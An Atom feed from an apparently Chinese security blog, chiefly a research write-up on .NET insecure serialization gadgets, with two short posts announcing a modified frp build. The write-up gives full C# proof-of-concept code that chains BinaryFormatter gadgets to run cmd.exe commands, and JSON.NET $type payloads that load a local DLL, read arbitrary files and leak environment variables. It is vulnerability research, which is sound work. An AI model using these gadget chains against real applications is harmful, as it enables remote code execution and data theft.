<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2024-05-01T10:16:18.030Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>frp-二开</title>
    <link href="https://ke1nys.github.io/posts/99d00ea3.html"/>
    <id>https://ke1nys.github.io/posts/99d00ea3.html</id>
    <published>2024-05-01T10:14:33.000Z</published>
    <updated>2024-05-01T10:16:18.030Z</updated>
    
    <content type="html"><![CDATA[<p>自己二开了个frp  版本<code>0.51.2</code></p><p><a href="https://github.com/ke1nys/frp">https://github.com/ke1nys/frp</a></p><p>大佬们觉得好用的话可以点个star</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己二开了个frp  版本&lt;code&gt;0.51.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ke1nys/frp&quot;&gt;https://github.com/ke1nys/frp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大佬们觉得好用的话可以点个sta</summary>
      
    
    
    
    
    <category term="frp" scheme="https://ke1nys.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>frp二开</title>
    <link href="https://ke1nys.github.io/posts/b1a19a3b.html"/>
    <id>https://ke1nys.github.io/posts/b1a19a3b.html</id>
    <published>2024-05-01T10:12:55.000Z</published>
    <updated>2024-05-01T10:12:55.897Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>dotnet Insecure Serialization</title>
    <link href="https://ke1nys.github.io/posts/177f810b.html"/>
    <id>https://ke1nys.github.io/posts/177f810b.html</id>
    <published>2024-04-17T09:26:14.000Z</published>
    <updated>2024-04-18T12:57:04.537Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception">https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception</a></p><p>前面的介绍上面的链接已经写的很详细了  这里就不写了  </p><p>下面的反序列化操作全是在序列化的时候  调用getter来进行完成的</p><h1 id="NET-Framework"><a href="#NET-Framework" class="headerlink" title=".NET Framework"></a>.NET Framework</h1><h2 id="SettingsPropertyValue"><a href="#SettingsPropertyValue" class="headerlink" title="SettingsPropertyValue"></a>SettingsPropertyValue</h2><p>序列化时触发 BinaryFormatter 反序列化</p><p>先看其getter方法</p><p><img src="../images/image-20240417195326690.png" alt="image-20240417195326690"></p><p>进入到这个Deserialize函数中去()</p><p><img src="../images/image-20240417195519687.png" alt="image-20240417195519687"></p><p><img src="../images/image-20240417195809577.png" alt="image-20240417195809577"></p><p>这里有两个if判断  并且是有两个反序列化点 </p><ul><li>this.SerializedValue的值为String类型的话  就会进入到这个GetObjectFromString函数中  这里面的话也可以进行BinaryFormatter反序列化</li><li>第二个就是this.SerializedValue为Byte[]类型的话  就会进入到下面的这个BinaryFormatter来进行反序列化操作</li></ul><p><img src="../images/image-20240417200100832.png" alt="image-20240417200100832"></p><p>刚好这个this.SerializedValue的值就是我们反序列化的内容</p><p>最终POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="comment">// using ConsoleApp.Gadget;</span></span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System.Configuration;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> ConsoleApp.InsecureSerialization;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp.InsecureSerialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SettingsPropertyValueDemo</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal textFormattingRunProperties = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream mem = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(mem, textFormattingRunProperties);</span><br><span class="line"></span><br><span class="line">                data = mem.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SettingsProperty property = <span class="keyword">new</span> SettingsProperty(<span class="string">&quot;test&quot;</span>);<span class="comment">//用这个的目的只是为了给SettingsPropertyValue构造函数传值</span></span><br><span class="line">            </span><br><span class="line">            SettingsPropertyValue settingsPropertyValue = <span class="keyword">new</span> SettingsPropertyValue(property);</span><br><span class="line">            settingsPropertyValue.Deserialized = <span class="literal">false</span>;</span><br><span class="line">            settingsPropertyValue.SerializedValue = data;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Console.Write(settingsPropertyValue.PropertyValue);</span></span><br><span class="line"></span><br><span class="line">            JsonSerializerSettings settings = <span class="keyword">new</span> JsonSerializerSettings</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.All,</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            JsonConvert.SerializeObject(settingsPropertyValue, settings);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SecurityException"><a href="#SecurityException" class="headerlink" title="SecurityException"></a>SecurityException</h2><p>序列化时触发 BinaryFormatter 反序列化</p><p>还是先看其getter方法</p><p><img src="../images/image-20240417202605443.png" alt="image-20240417202605443"></p><p>跟进getMethod函数中去</p><p><img src="../images/image-20240417202634658.png" alt="image-20240417202634658"></p><p>根据这个函数名字  字节数组转成对象  一猜就知道这个函数里面实现了反序列化操作  跟进</p><p><img src="../images/image-20240417202731928.png" alt="image-20240417202731928"></p><p>对传入的序列化字节数组进行Binary反序列化操作</p><p>但是这里的话有点问题就是</p><p><img src="../images/image-20240417203133985.png" alt="image-20240417203133985"></p><p>其实说白了就是这里的setter方法在反序列化的时候会被调用来进行给<code>m_serializedMethodInfo</code>赋值  会给我们刚开始传入的值给覆盖掉  但是利用失败</p><p><img src="../images/image-20240417203433761.png" alt="image-20240417203433761"></p><p>就是这里有问题</p><p>部分序列化器在反序列化恢复字段时会调用 Method setter, 导致覆盖 m_serializedMethodInfo 的内容, 无法触发恶意 Gadget</p><p>因此需要某个不完全依赖于 setter 赋值的序列化器, 例如 BinaryFormatter/Json.Net, 都支持调用特殊的反序列化构造函数</p><p><img src="../images/image-20240417203611917.png" alt="image-20240417203611917"></p><p>说白了就是这个调用这个类的构造函数可以替代setter方法  在反序列化的时候就不会导致m_serializedMethodInfo的值被覆盖</p><p>另外后续序列化时所使用的序列化器应当直接调用 Method getter, 而不是 GetObjectData 方法</p><p>POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="comment">// using ConsoleApp.Gadget;</span></span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> ConsoleApp.InsecureSerialization;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp.InsecureSerialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SecurityExceptionDemo</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal textFormattingRunProperties = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] data;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream mem = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(mem, textFormattingRunProperties);</span><br><span class="line"></span><br><span class="line">                data = mem.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SecurityException securityException = <span class="keyword">new</span> SecurityException();</span><br><span class="line">            <span class="keyword">typeof</span>(SecurityException)</span><br><span class="line">                .GetField(<span class="string">&quot;m_serializedMethodInfo&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic)</span><br><span class="line">                .SetValue(securityException, data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Console.Write(securityException.Method);</span></span><br><span class="line"></span><br><span class="line">            JavaScriptSerializer javaScriptSerializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            javaScriptSerializer.Serialize(securityException);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JavaScriptSerializer进行序列化操作的话  调用的是getter方法  而不是GetObjectData方法</p><h2 id="CompilerResults"><a href="#CompilerResults" class="headerlink" title="CompilerResults"></a>CompilerResults</h2><p>序列化时触发本地 DLL 加载 (Assembly.Load), 类似 AssemblyInstaller</p><p><img src="../images/image-20240417211809604.png" alt="image-20240417211809604"></p><p>这里的话是进行赋值操作</p><p><img src="../images/image-20240417211905393.png" alt="image-20240417211905393"></p><p>CompiledAssembly getter  其就会加载我们上面赋值的那个pathToAssembly参数</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51&quot;,</span><br><span class="line">    &quot;tempFiles&quot;: null,</span><br><span class="line">    &quot;PathToAssembly&quot;: &quot;C:\\Users\\Public\\mixedassembly.dll&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意自 .NET Framework 4 开始禁止通过 Assembly.Load 加载远程 DLL, 因此需要与写文件 Gadget 结合</p><h1 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h1><h2 id="ActiveMQObjectMessage"><a href="#ActiveMQObjectMessage" class="headerlink" title="ActiveMQObjectMessage"></a>ActiveMQObjectMessage</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache.NMS.ActiveMQ</span><br></pre></td></tr></table></figure><h3 id="lt-2-1-0版本"><a href="#lt-2-1-0版本" class="headerlink" title="&lt;2.1.0版本"></a>&lt;2.1.0版本</h3><p>序列化时触发 Binary Formatter 反序列化, 兼容大多数基于 setter 的序列化器</p><p>这个玩意序列化的时候还挺简单</p><p><img src="../images/image-20240417214503692.png" alt="image-20240417214503692"></p><p><img src="../images/image-20240417214517125.png" alt="image-20240417214517125"></p><p>其Formatter默认是BinaryFormatter、</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.0.1.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;,</span><br><span class="line">    &quot;Content&quot;: &quot;base64encoded-binaryformatter-gadget&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-0版本"><a href="#2-1-0版本" class="headerlink" title="2.1.0版本"></a>2.1.0版本</h3><p><img src="../images/image-20240417214705912.png" alt="image-20240417214705912"></p><p>其实就是多了这一行代码</p><p>2.1.0 版本增加了 TrustedClassFilter (SerializationBinder), 需要指定 Connection.DeserializationPolicy</p><p>但是对于序列化 gadget 没有影响, 自己手动构造将 DeserializationPolicy 设置为 null 就行</p><p><img src="../images/image-20240417215234206.png" alt="image-20240417215234206"></p><p>POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content&quot;</span>: <span class="string">&quot;base64-encoded-binaryformatter-gadget&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;connectionUri&quot;</span>: <span class="string">&quot;http://localhost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;transport&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Transport.Failover.FailoverTransport, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;clientIdGenerator&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;Apache.NMS.ActiveMQ.Util.IdGenerator, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="OptimisticLockedTextFile"><a href="#OptimisticLockedTextFile" class="headerlink" title="OptimisticLockedTextFile"></a>OptimisticLockedTextFile</h2><p>Amazon AWSSDK.Core</p><p>序列化时可以读取任意文件, 但是需要通过序列化来接收文件内容</p><p><img src="../images/image-20240417215958166.png" alt="image-20240417215958166"></p><p>构造函数传入filepath  然后调用read()函数</p><p><img src="../images/image-20240417220050410.png" alt="image-20240417220050410"></p><p>读取文件内容传入OriginalContents和Lines中去</p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Amazon.Runtime.Internal.Util.OptimisticLockedTextFile, AWSSDK.Core, Version=3.3.0.0, Culture=neutral, PublicKeyToken=885c28607f98e604&quot;,</span><br><span class="line">    &quot;filePath&quot;: &quot;C:\\Windows\\win.ini&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240417220244090.png" alt="image-20240417220244090"></p><p>因为其实private</p><h2 id="CustomUri"><a href="#CustomUri" class="headerlink" title="CustomUri"></a>CustomUri</h2><p>位于 Castle Core</p><p>反序列化时会调用 Environment.ExpandEnvironmentVariables 解析 resourceIdentifier 中的环境变量</p><p>同样需要通过序列化来接收数据</p><p><img src="../images/image-20240417221142806.png" alt="image-20240417221142806"></p><p><img src="../images/image-20240417221159715.png" alt="image-20240417221159715"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Castle.Core.Resource.CustomUri, Castle.Core, Version=5.0.0.0, Culture=neutral, PublicKeyToken=407dd0808d44fbdc&quot;,</span><br><span class="line">    &quot;resourceIdentifier&quot;: &quot;C:\\test\\%PATHEXT%&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="QueryPartitionProvider"><a href="#QueryPartitionProvider" class="headerlink" title="QueryPartitionProvider"></a>QueryPartitionProvider</h2><p>位于 Microsoft Azure.Core</p><p>在反序列化时触发 Json.Net 序列化, 可以与上面的序列化 Gadget 相结合</p><p><img src="../images/image-20240417222510921.png" alt="image-20240417222510921"></p><p>其构造函数可以进行Json.Net序列化操作  那么可以配合上面的Gadget来打</p><p>例如与 ActiveMQObjectMessage 结合</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$type&quot;: &quot;Microsoft.Azure.Cosmos.Query.Core.QueryPlan.QueryPartitionProvider, Microsoft.Azure.Cosmos.Client, Version=3.32.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,</span><br><span class="line">    &quot;queryengineConfiguration&quot;: &#123;</span><br><span class="line">        &quot;poc&quot;: &#123;</span><br><span class="line">            &quot;$type&quot;: &quot;Apac he.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.0.1.0, Culture=neutral, PublicKeyToken=82756feee3957618&quot;,</span><br><span class="line">            &quot;Content&quot;: &quot;base64-encoded-binaryformatter-gadget&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化的时候刚好调用ActiveMQObjectMessage这个类中的getter方法  然后就会触发里面的反序列化操作</p><p><strong><a href="https://exp10it.io/2024/02/dotnet-new-deserialization-gadgets/#xamlimageinfo">https://exp10it.io/2024/02/dotnet-new-deserialization-gadgets/#xamlimageinfo</a>  xz总结的Gadgets  就不重新开文章了  直接写就行了</strong></p><p><strong>可以配合我们这一篇文章来看</strong></p>]]></content>
    
    
      
      
